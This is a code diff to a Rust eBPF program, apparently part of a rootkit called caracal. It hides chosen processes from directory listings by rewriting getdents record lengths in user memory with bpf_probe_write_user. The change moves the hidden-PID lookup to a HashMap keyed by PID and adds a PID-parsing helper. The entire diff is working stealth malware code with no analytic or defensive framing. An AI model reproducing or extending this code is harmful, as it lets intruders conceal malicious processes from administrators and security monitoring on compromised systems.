@@ -5,22 +5,16 @@ use aya_ebpf::{
         bpf_probe_write_user,
     },
     macros::{map, tracepoint},
-    maps::{Array, HashMap},
+    maps::HashMap,
     programs::TracePointContext,
 };
 use aya_log_ebpf::{debug, error};
-use caracal_common::{MAX_BPF_OBJ, MAX_DIRENTS, MAX_HIDDEN_PIDS, MAX_PID_LENGTH};
+use caracal_common::{MAX_BPF_OBJ, MAX_DIRENTS, MAX_HIDDEN_PIDS};
 
 #[map]
 static PID_DIRENTS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(MAX_BPF_OBJ, 0);
 #[map]
-static HIDDEN_PIDS: Array<HiddenPid> = Array::with_max_entries(MAX_HIDDEN_PIDS, 0);
-
-#[repr(C)]
-struct HiddenPid {
-    bytes: [u8; MAX_PID_LENGTH as usize],
-    len: usize,
-}
+static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::<u32, u8>::with_max_entries(MAX_HIDDEN_PIDS, 0);
 
 #[repr(C)]
 #[derive(Debug)]
@@ -86,7 +80,7 @@ pub fn caracal_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
 fn remove_curr_dirent(ctx: &mut DirentIteratorData) -> Result<(), i64> {
     let d_reclen_new = ctx.d_reclen + ctx.d_reclen_prev;
 
-    let _ = unsafe {
+    unsafe {
         bpf_probe_write_user(
             (ctx.dirents_buf_addr + ctx.bpos - ctx.d_reclen_prev as u64 + 16u64) as *mut u16,
             &d_reclen_new as *const u16,
@@ -96,6 +90,25 @@ fn remove_curr_dirent(ctx: &mut DirentIteratorData) -> Result<(), i64> {
     Ok(())
 }
 
+#[inline]
+fn parse_pid(buf: [u8; 10]) -> u32 {
+    let mut pid: u32 = 0;
+    let mut i = 0;
+
+    while i < 10 {
+        let b = buf[i];
+        if b == 0 {
+            break;
+        }
+        if !b.is_ascii_digit() {
+            break;
+        }
+        pid = pid.wrapping_mul(10).wrapping_add((b - b'0') as u32);
+        i += 1;
+    }
+
+    pid
+}
 #[inline]
 fn patch_dirent_if_found(idx: u32, ctx: &mut DirentIteratorData) -> i64 {
     if idx >= MAX_DIRENTS {
@@ -116,39 +129,26 @@ fn patch_dirent_if_found(idx: u32, ctx: &mut DirentIteratorData) -> i64 {
             ctx.d_reclen = dirent.d_reclen;
 
             let mut buf = [0u8; 10];
-            let parsed_pid = unsafe {
+            let _ = unsafe {
                 bpf_probe_read_user_str_bytes(
                     (ctx.dirents_buf_addr + ctx.bpos + 19) as *const u8,
                     &mut buf,
                 )
+                .unwrap()
             };
 
-            let parsed_pid = parsed_pid.unwrap();
-
-            let mut found = false;
-            for i in 0..MAX_HIDDEN_PIDS {
-                if let Some(hidden_pid) = HIDDEN_PIDS.get(i) {
-                    if {
-                        let mut found = true;
-                        for j in 0..parsed_pid.len() {
-                            if hidden_pid.bytes[j] != parsed_pid[j] {
-                                found = false;
-                                break;
-                            }
-                        }
-                        found
-                    } && hidden_pid.len == parsed_pid.len()
-                    {
-                        debug!(ctx.ctx, "FOUND IT!! @{} #map {}  ", idx, i,);
-                        if remove_curr_dirent(ctx).is_err() {
-                            error!(ctx.ctx, "Error in patching");
-                            return 1;
-                        }
-                        found = true;
-                        break;
+            let parsed_pid = parse_pid(buf);
+            let found = unsafe { HIDDEN_PIDS.get(&parsed_pid).is_some() };
+            if found {
+                {
+                    debug!(ctx.ctx, "FOUND IT!! @{} ", idx);
+                    if remove_curr_dirent(ctx).is_err() {
+                        error!(ctx.ctx, "Error in patching");
+                        return 1;
                     }
                 }
             }
+
             ctx.bpos += dirent.d_reclen as u64;
             if !found {
                 ctx.d_reclen_prev = dirent.d_reclen;
